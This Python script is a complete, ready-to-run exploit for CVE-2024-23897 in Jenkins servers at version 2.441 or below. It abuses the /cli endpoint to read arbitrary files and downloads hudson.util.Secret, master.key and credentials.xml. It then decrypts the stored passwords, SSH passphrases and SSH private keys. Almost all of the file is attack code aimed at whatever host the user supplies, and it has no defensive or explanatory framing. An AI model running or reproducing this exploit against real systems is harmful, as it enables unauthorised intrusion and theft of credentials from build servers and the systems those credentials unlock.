import argparse
import base64
import binascii
import re
import requests
import threading
import time
import uuid
from concurrent.futures import ThreadPoolExecutor
from Crypto.Cipher import AES
from hashlib import sha256


def parse_args():
	parser = argparse.ArgumentParser(description='Decrypt global credential passwords using CVE-2024-23897 from Jenkins on Windows')
	parser.add_argument('-w', '--website', type=str, required=True, help='Required. Jenkins website URL or IP')
	parser.add_argument('-wp', '--webport', type=int, help='Jenkins website port (default: 8080)')
	return parser.parse_args()


def check_connection(WEBSITE):
	#Checking connection to Jenkins server
	try:
		r = requests.get(WEBSITE)
		print ("[>] Connecting to Jenkins server", end='', flush=True); [print('.', end='', flush=True) or time.sleep(0.5) for _ in range(5)]; print()
		#Server information based on response headers
		print ("[+] Server version: " + r.headers['Server'])
		print ("[+] Jenkins version: " + r.headers['X-Jenkins'])
		print ("[+] Hudson version: " + r.headers['X-Hudson'])
		print ("    [ ] ...")
		jenkins_version = int(r.headers['X-Jenkins'][0:1] + r.headers['X-Jenkins'][2:5])
		if jenkins_version >= 2442:
			print ("[X] Jenkins version not vulnerable!")
			print ("[X] This exploit works only in versions <= 2.441")
			exit()
		print ("[>] Checking anonymous authorization level...")
		if r.status_code == 200:
			print ("    [+] Overall/Read permission found")
			print ("    [+] Anonymous can read ANY local files...")
			return True
		elif r.status_code == 403:
			print ("    [-] Overall/Read permission NOT found")
			print ("    [-] Anonymous can read only first 3 lines of ANY local files")
			return False
	except:
		print ("[X] Error: Can not connect to Jenkins server. Check URL and port.")
		exit()


def first_request(WEBSITE, SESSION, PATH, PARAMS):
	# First request is in charge to download the responses from server
	headers1 = {
		"Session": SESSION,
		"Side": "download",
		"Content-type": "application/x-www-form-urlencoded"
	}
	# Send first POST request
	req_session = requests.Session()
	t = req_session.post(WEBSITE + PATH, headers=headers1, params=PARAMS)
	# Receive data from the response and keep them as hex
	req_session.close()
	hex_values = []
	for byte in t.content:
		hex_values.append(hex(byte)[2:].zfill(2))
	hex_string = ''.join(hex_values)

	# Tracing boundaries where the retrieved data is in the response
	# ERROR: "..............." is not a valid option
	if "4552524f523a2022" in hex_string and "22206973206e6f7420612076616c6964206f7074696f6e" in hex_string:
		start = hex_string.index("4552524f523a2022") + 16
		end = hex_string.index("22206973206e6f7420612076616c6964206f7074696f6e")
	# ERROR: Too many arguments: ............... $ java
	elif "4552524f523a20546f6f206d616e7920617267756d656e74733a20" in hex_string and "0d0a00000024086a617661" in hex_string:
		start = hex_string.index("4552524f523a20546f6f206d616e7920617267756d656e74733a20") + 54
		end = hex_string.index("0d0a00000024086a6176")
	elif "4552524f523a20546f6f206d616e7920617267756d656e74733a20" in hex_string and "0a00000024086a617661" in hex_string:
		start = hex_string.index("4552524f523a20546f6f206d616e7920617267756d656e74733a20") + 54
		end = hex_string.index("0a00000024086a6176")
	# ERROR: No such job ............... exists. Perhaps
	elif "4552524f523a204e6f2073756368206a6f6220" in hex_string and "206578697374732e2050657268617073" in hex_string:
		start = hex_string.index("4552524f523a204e6f2073756368206a6f6220") + 38
		end = hex_string.index("206578697374732e2050657268617073")
	# ERROR: No argument is allowed: ............... " java"
	elif "4552524f523a204e6f20617267756d656e7420697320616c6c6f7765643a20" in hex_string and "0a00000022086a617661" in hex_string:
		start = hex_string.index("4552524f523a204e6f20617267756d656e7420697320616c6c6f7765643a20") + 62
		end = hex_string.index("0a00000022086a617661")
	# ERROR: ............... " java"
	elif "4552524f523a20" in hex_string and "0a00000022086a617661" in hex_string:
		start = hex_string.index("4552524f523a20") + 14
		end = hex_string.index("0a00000022086a617661")
	# ERROR: No such job ............... exists.
	elif "4552524f523a204e6f2073756368206a6f6220" in hex_string and "206578697374732e0" in hex_string:
		start = 0
		end = 0
	# ERROR: Argument "..............." is required
	elif "4552524f523a20417267756d656e742022" in hex_string and "222069732072657175697265640" in hex_string:
		start = 0
		end = 0
	# ERROR: anonymous
	elif "4552524f523a20616e6f6e796d6f757320" in hex_string:
		start = 0
		end = 0	
	# username and password
	elif "757365726e616d65" in hex_string and "70617373776f7264" in hex_string:
		start = 0
		end = len(hex_string)
	return hex_string[start:end]


def second_request(line, WEBSITE, SESSION, PATH, PARAMS):
	# Second request es in charge to send the command to the server
	print ("    [ ] ...")
	headers2 = {
		"Session": SESSION,
		"Side": "upload",
		"Content-type": "application/octet-stream"
	}
	data = binascii.unhexlify(line)
	request_obj = requests.Request('POST', WEBSITE + PATH, headers=headers2, params=PARAMS, data=data)
	# Obtain prepared request and delete Content-Length
	prepared_request = request_obj.prepare()
	prepared_request.headers.pop("Content-Length", None)
	# Send second POST request
	s = requests.Session()
	response = s.send(prepared_request)
	s.close()


def get_installation_folder(WEBSITE, SESSION, PATH, PARAMS):
	# Send requests to known paths and guess where is Jenkins installed
	print("[>] Checking Jenkins installation folder")
	poss_paths = {
		# java -jar jenkins-cli.jar -s <JENKINS_URL> who-am-i @'C:\ProgramData\Jenkins\.jenkins\secrets\hudson.util.Secret'
		"3d00003b40": r"C:\ProgramData\Jenkins\.jenkins\secrets\hudson.util.Secret",
		# java -jar jenkins-cli.jar -s <JENKINS_URL> who-am-i @'C:\Program Files (x86)\Jenkins\secrets\hudson.util.Secret'
		"3c00003a40": r"C:\Program Files (x86)\Jenkins\secrets\hudson.util.Secret",
		# java -jar jenkins-cli.jar -s <JENKINS_URL> who-am-i @'C:\Program Files\Jenkins\secrets\hudson.util.Secret'
		"3600003440": r"C:\Program Files\Jenkins\secrets\hudson.util.Secret",
		# java -jar jenkins-cli.jar -s <JENKINS_URL> who-am-i @'/var/lib/jenkins/secrets/hudson.util.Secret'
		"2e00002c40": r"/var/lib/jenkins/secrets/hudson.util.Secret"
		}

	max_retries, retry_delay, retry_count = 3, 3, 0
	while retry_count < max_retries:
		try:
			with ThreadPoolExecutor(max_workers=2) as executor:
				for key, path in poss_paths.items():
					# Generate a request line for each path
					line = "0000000a00000877686f2d616d2d69000000" + key + path.encode('utf-8').hex()
					# Retrieve credentials file
					first_request_future = executor.submit(first_request, WEBSITE, SESSION, PATH, PARAMS)
					time.sleep(1)
					second_request_future = executor.submit(second_request, line, WEBSITE, SESSION, PATH, PARAMS)
					hex_all = first_request_future.result()
					second_request_future.result()
					time.sleep(1)
					ascii_text = bytes.fromhex(hex_all).decode('utf-8', errors='ignore')
					if "No such file" not in ascii_text:
						print ("[>] Jenkins installation path found!")
						ascii_path = bytes.fromhex(line[46:-54]).decode('utf-8', errors='ignore')
						print (f"    [>] {ascii_path}")
						return key, ascii_path
			break
		except:
			print("    [-] Requests not completed. Retrying...")
			retry_count += 1
			time.sleep(retry_delay)
	print("[X] No Jenkins secret credentials were found...")
	print("[X] Exploit not completed. Try again!")
	exit()


def retrieve_hudson_secret(WEBSITE, SESSION, PATH, PARAMS, KEY, INS_FOLDER):
	# This sends 3 requests to download hudson.util.Secret from server
	print("[>] Downloading hudson.util.Secret binary file")
	# java -jar jenkins-cli.jar -s http://<JENKINS_IP>:8080 keep-build NAME 1 @'<JENKINS_PATH>\secrets\hudson.util.Secret'
	# Replace backslashes to slashes if requests are going to linux
	path = r"/secrets/hudson.util.Secret" if "/var/lib/jenkins" in INS_FOLDER else r"\secrets\hudson.util.Secret"
	SECRET_PATH_HEX = (INS_FOLDER + path).encode('utf-8').hex()
	# List of CLI commands in hex
	lines = {
		"First" : "0000000c00000a6b6565702d6275696c64000000060000044e414d450000000300000131000000" + KEY + SECRET_PATH_HEX,
		"Second" : "0000000c00000a6b6565702d6275696c64000000060000044e414d45000000" + KEY + SECRET_PATH_HEX,
		"Third" : "0000000c00000a6b6565702d6275696c64000000" + KEY + SECRET_PATH_HEX
	}

	max_retries, retry_delay, retry_count = 3, 3, 0
	while retry_count < max_retries:
		hex_all = ""
		try:
			with ThreadPoolExecutor(max_workers=2) as executor:
				for part, line in lines.items():
					# Retrieve each part of binary file
					first_request_future = executor.submit(first_request, WEBSITE, SESSION, PATH, PARAMS)
					time.sleep(2)
					second_request_future = executor.submit(second_request, line, WEBSITE, SESSION, PATH, PARAMS)
					hex_all += first_request_future.result()
					hex_all = hex_all.replace("0000000208","")
					hex_all = hex_all.replace("00000001","")
					hex_all += "0a" if len(hex_all) != 544 else ""
					second_request_future.result()
					time.sleep(2)
					print(f"    [+] {part} part of the binary done! {len(hex_all)} bytes")
					# If binary file reaches the correct size, loop ends
					if len(hex_all) == 544:
						break
			break
		except:
			print("    [-] Requests not completed. Retrying...")
			retry_count += 1
			time.sleep(retry_delay)
	if retry_count == max_retries:
		print("[X] Exploit not completed after multiple attempts... Try again!")
		exit()

	# Split the response and encode hex to Windows-1252, then convert to bytes
	bytes_object = bytes.fromhex(hex_all)
	win_encoded = bytes_object.decode('windows-1252', errors='ignore').encode('windows-1252', errors='ignore')
	bin_result = win_encoded.hex()
	bin_result = bin_result.replace("3f","9d",1)
	bin_result = bin_result.replace("3f","8f",1)
	if len(bin_result) != 544:
		print ("    [-] Binary file was not retrieved complete, downloading II key!")
		retrieve_instance_key(WEBSITE, SESSION, PATH, PARAMS, KEY, INS_FOLDER, bin_result)
	else:
		print ("    [+] We got lucky, binary file was retrieved complete on first try!")
		# Convert hex to bytes and write to a file
		binary_data = bytes.fromhex(bin_result)
		with open("hudson.util.Secret", 'wb') as binary_file:
			binary_file.write(binary_data)
		print ("    [+] Gluing all parts into a single binary file done!")
		print("[>] Downloading hudson.util.Secret completed!")


def retrieve_instance_key(WEBSITE, SESSION, PATH, PARAMS, KEY, INS_FOLDER, bin_result):
	# If hudson.util.Secret can not be downloaded complete, it downloads another key and concatenate both data
	print("[>] Downloading InstanceIdentity.key binary file")
	# java -jar jenkins-cli.jar -s http://<JENKINS_IP>:8080 keep-build NAME 1 @'<JENKINS_PATH>\secrets\org.jenkinsci.main.modules.instance_identity.InstanceIdentity.KEY'
	# Key mapping, according to the identified Jenkins path, the key changes
	key_mapping = {
		"3c00003a40": "6b00006940",
		"3600003440": "2e00002c40",
		"3d00003b40": "6c00006a40",
		"2e00002c40": "5d00005b40"
	}
	KEY = key_mapping.get(KEY, KEY)
	# Replace backslashes to slashes if requests are going to linux
	path = r"/secrets/org.jenkinsci.main.modules.instance_identity.InstanceIdentity.KEY" if "/var/lib/jenkins" in INS_FOLDER else r"\secrets\org.jenkinsci.main.modules.instance_identity.InstanceIdentity.KEY"
	INSIDE_PATH_HEX = (INS_FOLDER + path).encode('utf-8').hex()
	# List of CLI commands in hex
	lines = {
		"First" : "0000000c00000a6b6565702d6275696c64000000060000044e414d450000000300000131000000" + KEY  + INSIDE_PATH_HEX,
		"Second" : "0000000c00000a6b6565702d6275696c64000000060000044e414d45000000" + KEY + INSIDE_PATH_HEX,
		"Third" : "0000000c00000a6b6565702d6275696c64000000" + KEY  + INSIDE_PATH_HEX
	}
	
	max_retries, retry_delay, retry_count = 3, 3, 0
	while retry_count < max_retries:
		hex_all = ""
		try:
			with ThreadPoolExecutor(max_workers=2) as executor:
				for part, line in lines.items():
					# Retrieve each part of binary file
					first_request_future = executor.submit(first_request, WEBSITE, SESSION, PATH, PARAMS)
					time.sleep(2)
					second_request_future = executor.submit(second_request, line, WEBSITE, SESSION, PATH, PARAMS)
					hex_all += first_request_future.result()
					hex_all = hex_all.replace("0000000208","")
					hex_all = hex_all.replace("00000001","")
					hex_all += "0a" if len(hex_all) != 544 else ""
					second_request_future.result()
					time.sleep(2)
					print (f"    [+] {part} part of the binary done! {len(hex_all)} bytes")
					# If binary file reaches the correct size, loop ends
					if len(hex_all) == 544:
						break
			break
		except:
			print ("    [-] Requests not completed. Retrying...")
			retry_count += 1
			time.sleep(retry_delay)
	if retry_count == max_retries:
		print("[X] Exploit not completed after multiple attempts... Try again!")
		exit()

	# Converting received data into InstanceIdentity key
	bytes_object = bytes.fromhex(hex_all)
	win_encoded = bytes_object.decode('windows-1252', errors='ignore').encode('windows-1252', errors='ignore')
	iik_bin_result = win_encoded.hex()
	if len(iik_bin_result) != 544:
		print ("    [-] InstanceIdentity Key binary file was not retrieved complete!")
		print ("[X] Error: Can not retrieve binary files to decode secrets. Try again!")
		exit()
	else:
		print ("[+] Downloading InstanceIdentity Key binary file completed!")
		# Filling the first binary with the last bytes of second binary
		miss_part = 544 - len(bin_result)
		bin_all = bin_result + iik_bin_result[-miss_part:]
		# Convert hex to bytes and write to a file
		binary_data = bytes.fromhex(bin_all)
		with open("hudson.util.Secret", 'wb') as binary_file:
			binary_file.write(binary_data)
		print ("    [+] Gluing both files all into a single binary file done!")
		print("[>] Downloading hudson.util.Secret completed!")


def retrieve_master_key(WEBSITE, SESSION, PATH, PARAMS, KEY, INS_FOLDER):
	# Download master.key from server
	print ("[>] Downloading master key file")
	# java -jar jenkins-cli.jar -s http://<JENKINS_IP>:8080 who-am-i @'<JENKINS_PATH>\secrets\master.key'
	# Key mapping, according to the identified Jenkins path, the key changes
	key_mapping = {
		"3c00003a40": "3400003240",
		"3600003440": "2e00002c40",
		"3d00003b40": "3500003340",
		"2e00002c40": "2600002440"
	}
	KEY = key_mapping.get(KEY, KEY)
	# Replace backslashes to slashes if requests are going to linux
	path = r"/secrets/master.key" if "/var/lib/jenkins" in INS_FOLDER else r"\secrets\master.key"
	KEY_PATH_HEX = (INS_FOLDER + path).encode('utf-8').hex()
	# CLI command in hex
	line = "0000000a00000877686f2d616d2d69000000" + KEY  + KEY_PATH_HEX
	
	max_retries, retry_delay, retry_count = 3, 3, 0
	while retry_count < max_retries:
		hex_all = ""
		try:
			with ThreadPoolExecutor(max_workers=2) as executor:
				first_request_future = executor.submit(first_request, WEBSITE, SESSION, PATH, PARAMS)
				time.sleep(1)
				second_request_future = executor.submit(second_request, line, WEBSITE, SESSION, PATH, PARAMS)
				hex_all = first_request_future.result()
				hex_all = hex_all.replace("0000000108","")
				hex_all = hex_all.replace("0000000208","")
				hex_all = hex_all[:-2] if hex_all.endswith("0d") else hex_all
				second_request_future.result()
				time.sleep(1)
				# If key file has the correct size, loop ends
				if len(hex_all) == 512:
					print (f"    [+] Master.key file retrieved! {len(hex_all)} bytes")
					break
		except:
			print ("    [-] Requests not completed. Retrying...")
			retry_count += 1
			time.sleep(retry_delay)
	if retry_count == max_retries:
		print("[X] Exploit not completed after multiple attempts... Try again!")
		exit()

	# Convert to ASCII only the bytes from the key
	ascii_chain = bytes.fromhex(hex_all).decode('ascii', errors='ignore')
	# Save master key
	with open("master.key", 'w', encoding='utf-8') as key_file:
		key_file.write(ascii_chain)
	print ("[>] Downloading master.key completed!")


def retrieve_credentials(WEBSITE, SESSION, PATH, PARAMS, KEY, INS_FOLDER, anon_access):
	# If anonymous has read permissions, it retrieve passwords from credentials.xml
	print ("[>] Checking if stored credentials can be downloaded...")
	# java -jar jenkins-cli.jar -s http://<JENKINS_IP>:8080 connect-node @'<JENKINS_PATH>\credentials.xml'
	# Key mapping, according to the identified Jenkins path, the key changes
	if anon_access == True:
		print ("    [+] Extracting stored credentials from file")
	else:
		print ("[X] Can not download credentials due to lack of permissions...!")
		return False

	key_mapping = {
		"3c00003a40": "3100002f40",
		"3600003440": "2b00002940",
		"3d00003b40": "3200003040",
		"2e00002c40": "2300002140"
	}
	KEY = key_mapping.get(KEY, KEY)
	# Replace backslashes to slashes if requests are going to linux
	path = r"/credentials.xml" if "/var/lib/jenkins" in INS_FOLDER else r"\credentials.xml"
	CREDS_PATH_HEX = (INS_FOLDER + path).encode('utf-8').hex()
	# CLI command in hex
	line = "0000000e00000c636f6e6e6563742d6e6f6465000000" + KEY + CREDS_PATH_HEX

	max_retries, retry_delay, retry_count = 3, 3, 0
	while retry_count < max_retries:
		hex_all = ""
		try:
			with ThreadPoolExecutor(max_workers=2) as executor:
				# Retrieve credentials file
				first_request_future = executor.submit(first_request, WEBSITE, SESSION, PATH, PARAMS)
				time.sleep(1)
				second_request_future = executor.submit(second_request, line, WEBSITE, SESSION, PATH, PARAMS)
				hex_all = first_request_future.result()
				second_request_future.result()
				time.sleep(1)
				# If key file has the correct size, loop ends
				if hex_all:
					break
		except:
			print ("    [-] Requests not completed. Retrying...")
			retry_count += 1
			time.sleep(retry_delay)
	if retry_count == max_retries:
		print("[X] Exploit not completed after multiple attempts... Try again!")
		exit()
	print ("[>] Extracting credentials from Jenkins completed!")
	
	# Receive data from the response and filter it to get usernames and passwords
	ascii_text = bytes.fromhex(hex_all).decode('utf-8', errors='ignore')
	user_search = re.findall(r'<username>(.*?)</username>', ascii_text)
	pass_search = re.findall(r'<password>{(.*?)}</password>', ascii_text)
	ssh_passphrase = re.findall(r'<passphrase>{(.*?)}</passphrase>', ascii_text)
	ssh_search = re.findall(r'<privateKey>{(.*?)}</privateKey>', ascii_text)

	if not user_search and not pass_search and not ssh_search:
		print ("[-] There is no global credentials saved. Usernames, passwords or SSH keys were not found!")
	else:
		# Print usernames found
		if user_search:
			print ("[>] Usernames found:")
			users_found = tuple(set(user_search))
			for users_f in users_found:
				print (f"    [+] {users_f}")
		else:
			print ("[-] There are no usernames saved in global credentials")
		# Print passwords found
		if pass_search:
			print ("[>] Passwords found (encrypted):")
			pass_found = tuple(set(pass_search))
			for pass_f in pass_found:
				print (f"    [+] {pass_f}")
		else:
			pass_found = None
		# Print SSH passphrases found
		if ssh_passphrase:
			print ("[>] SSH passphrases found (encrypted):")
			passphrase_found = tuple(set(ssh_passphrase))
			for passphrase_f in passphrase_found:
				print (f"    [+] {passphrase_f}")
		else:
			passphrase_found = None
		# Print SSH Private keys found
		if ssh_search:
			print ("[>] SSH Private keys found (encrypted):")
			ssh_found = tuple(set(ssh_search))
			for ssh_f in ssh_found:
				print (f"    [+] {ssh_f[:50]}...")
		else:
			ssh_found = None
	return pass_found, passphrase_found, ssh_found


def decrypt_passwords(pass_found, passphrase_found, ssh_found, tries=0):
	# If passwords are found, start decryption process
	if pass_found or passphrase_found or ssh_found:
		if tries == 0:
			print ("[>] Decrypting found credentials..", end='')
			time.sleep(1)
		decryption_magic = b'::::MAGIC::::'
		# Retrieve confidentiality key
		def get_confidentiality_key():
			with open("master.key", 'r') as f:
				master_key = f.read().encode('utf-8')
			with open("hudson.util.Secret", 'rb') as f:
				hudson_secret = f.read()
			return decrypt_confidentiality_key(sha256(master_key).digest()[:16], hudson_secret)
		# Decrypting confidentiality key
		def decrypt_confidentiality_key(derived_master_key, hudson_secret):
			cipher_handler = AES.new(derived_master_key, AES.MODE_ECB)
			decrypted_hudson_secret = cipher_handler.decrypt(hudson_secret)
			return decrypted_hudson_secret[:16] if decryption_magic in decrypted_hudson_secret else None
		# Decrypting secret in  Jenkins (AES CBC)
		def decrypt_secret(encoded_secret, confidentiality_key):
			if not encoded_secret:
				return
			try:
				encrypted_secret = base64.b64decode(encoded_secret)
				iv = encrypted_secret[9:9+16]
				cipher_handler = AES.new(confidentiality_key, AES.MODE_CBC, iv)
				decrypted_secret = cipher_handler.decrypt(encrypted_secret[9+16:])
				padding_value = decrypted_secret[-1]
				secret_length = len(decrypted_secret) - padding_value
				return decrypted_secret[:secret_length] if padding_value <= 16 else decrypted_secret
			except base64.binascii.Error as error:
				print (f'[X] Failed base64 decoding the input with error: {error}')
				return
			except:
				bruteforcing_secret(pass_found, tries)
		# Get confidentiality key
		confidentiality_key = get_confidentiality_key()
		# Decrypt every password found
		if pass_found:
			decrypted_list = [] 
			for secret in pass_found:
				decrypted_secret = decrypt_secret(secret, confidentiality_key)
				if decrypted_secret:
					decrypted_list.append(decrypted_secret)
			if decrypted_list: 
				print (".")
				print ("[>] Decrypted passwords:")
				for decrypted_secret in decrypted_list:
					print("    [+] " + decrypted_secret.decode('utf-8', errors='ignore'))
		# Decrypt every SSH passphrase found
		if passphrase_found:
			decrypted_passphrase_list = []
			for passphrase_secret in passphrase_found:
				decrypted_passphrase_secret = decrypt_secret(passphrase_secret, confidentiality_key)
				if decrypted_passphrase_secret:
					decrypted_passphrase_list.append(decrypted_passphrase_secret)
			if decrypted_passphrase_list:
				print ("[>] Decrypted SSH passphrase:")
				for decrypted_passphrase_secret in decrypted_passphrase_list:
					print("    [+] " + decrypted_passphrase_secret.decode('utf-8', errors='ignore'))
		# Decrypt every SSH private key found
		if ssh_found:
			decrypted_ssh_list = []
			for ssh_secret in ssh_found:
				decrypted_ssh_secret = decrypt_secret(ssh_secret, confidentiality_key)
				if decrypted_ssh_secret:
					decrypted_ssh_list.append(decrypted_ssh_secret)
			if decrypted_ssh_list:
				print ("[>] Decrypted SSH Private keys:")
				for decrypted_ssh_secret in decrypted_ssh_list:
					print("    [+]\n" + decrypted_ssh_secret.decode('utf-8', errors='ignore'))
	else:
		print ("[-] Skipping decrypting passwords...")
		return


def bruteforcing_secret(pass_found, tries):
	# In case hudson.util.Secret losses last byte
	with open("hudson.util.Secret", 'rb') as f:
		hudson_secret = f.read()
	hex_string = binascii.hexlify(hudson_secret).decode('utf-8')
	time.sleep(0.2)
	if tries == 0:
		print (".\n    [>] Trying to repair hudson.util.Secret binary")
		print ("    [ ] ", end='')
	if tries % 10 == 0:
		print('.', end='', flush=True)
	if tries <= 255:
		hex_number = hex(tries)[2:].zfill(2)
		hex_string = hex_string[:-2] + hex_number
	else:
		print ("\n[X] Failed to decrypt passwords, binary files or encrypted passwords had errors...")
		return

	# Convert hex to bytes and write to a file
	binary_data = bytes.fromhex(hex_string)
	with open("hudson.util.Secret", 'wb') as binary_file:
		binary_file.write(binary_data)

	# Restart decrypting process with the modified binary file
	try:
		decrypt_passwords(pass_found, tries + 1)
	except KeyboardInterrupt:
		exit()
	except:
		return


def main():
	args = parse_args()
	WEB_URL = args.website if 'http' in args.website else 'http://' + args.website
	WEB_PORT = args.webport if args.webport else 8080
	WEBSITE = str(WEB_URL) + ':' + str(WEB_PORT)

	# Define some items used in the requests
	SESSION = str(uuid.uuid4())
	PATH = "/cli"
	PARAMS = {"remoting": "false"}

	# Check connection to Jenkins server and Anonymous privilege level
	anon_access = check_connection(WEBSITE)
	# Verify in which possible folders is Jenkins installed
	KEY, INS_FOLDER = get_installation_folder(WEBSITE, SESSION, PATH, PARAMS)
	# Download hudson.util.Secret binary file
	retrieve_hudson_secret(WEBSITE, SESSION, PATH, PARAMS, KEY, INS_FOLDER)
	# Download master.key file
	retrieve_master_key(WEBSITE, SESSION, PATH, PARAMS, KEY, INS_FOLDER)
	# Retrieve credentials.xml to extract passwords
	pass_found, passphrase_found, ssh_found = retrieve_credentials(WEBSITE, SESSION, PATH, PARAMS, KEY, INS_FOLDER, anon_access)
	# If passwords are found, decrypt them
	decrypt_passwords(pass_found, passphrase_found, ssh_found)


if __name__ == '__main__':
	main()
	print ("[>] Exploit done!")
